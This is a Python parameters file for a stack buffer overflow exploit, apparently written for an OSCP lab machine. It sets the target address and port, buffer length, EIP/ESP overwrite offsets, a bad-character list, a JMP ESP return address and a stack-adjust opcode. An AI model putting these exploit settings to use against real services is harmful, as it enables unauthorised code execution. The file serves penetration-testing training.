# PARAMETERS.py
# This is the files with all the variables
# This has been designed for the OSCP buffer overflow machine

RHOST = "192.168.1.81"
RPORT = 4455

# Total length of the buffer to send
buf_totlen = 3000

# Offset at which the EIP is overwritten
offset_eip = 1949

# Offset at which the ESP is overwritten
offset_esp = 1953

# Badchars sequence, comma-separated
#badchars = [0x00]
badchars = [0x00,0x04,0x05,0xA2,0xA3,0xAC,0xAD,0xC0,0xC1,0xEF,0xF0]

# Generate the string
badchar_sequence = bytes(c for c in range(256) if c not in badchars)

# Address of the JMP ESP operation
ptr_jmp_esp = 0x52586683

# To avoid setting a nop sled
sub_esp_10 = b"\x83\xec\x10"


